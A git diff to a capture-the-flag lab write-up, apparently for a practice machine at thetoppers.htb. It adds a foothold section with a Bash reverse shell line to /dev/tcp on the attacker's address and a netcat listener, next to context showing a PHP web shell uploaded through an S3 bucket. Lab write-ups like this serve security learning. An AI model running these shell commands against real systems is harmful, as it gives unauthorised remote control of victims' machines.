@@ -6,7 +6,7 @@
 
 
 
-### Recon & Enumeration
+## Recon & Enumeration
  Scanned target for open ports 
  ```bash
 sudo nmap -sV 10.129.126.39
@@ -59,7 +59,7 @@ The s3 bucket object index.php confirmed that the website is running PHP
 ---
 
 
-### Exploitation
+## Exploitation
 
 **Initial Access**
 
@@ -83,6 +83,39 @@ aws --endpoint=http://s3.thetoppers.htb/ s3 cp shell.php s3://thetoppers.htb/
 Confirmed the existence of the uploaded shell by navigating to http://s3.thetoppers.htb/shell.php and executing the id command 
 
 [!Shell-Success](Images/three_shell-confirmation.jpeg)
+
+
+
+### Establishing a Foothold 
+
+#### Preparing the Reverse Shell & Listener ####
+
+Created a Bash reverse shell (shell.sh) that establishes a TCP connection to the attacker's machine and redirects the stdin, stdout, and stderr over the connection 
+
+```bash
+bash -i >& /dev/tcp/10.10.17.95/1337 0>&1
+
+```
+![Rev-Shell-Payload](Images/three_reverse-shell.jpeg)
+
+
+Began a Netcat Listener on port 1337 to receive the incoming reverse shell connection 
+
+```bash 
+nc -lvnp 1337
+```
+![Netcat-Listener](Images/three_listener.jpeg)
+
+
+#### Hosting the Payload ####
+
+Started a Python Web Server to host the reverse shell payload, allowing the compromised host to access it over HTTP
+
+```bash
+
+```
+
+
 
 
 
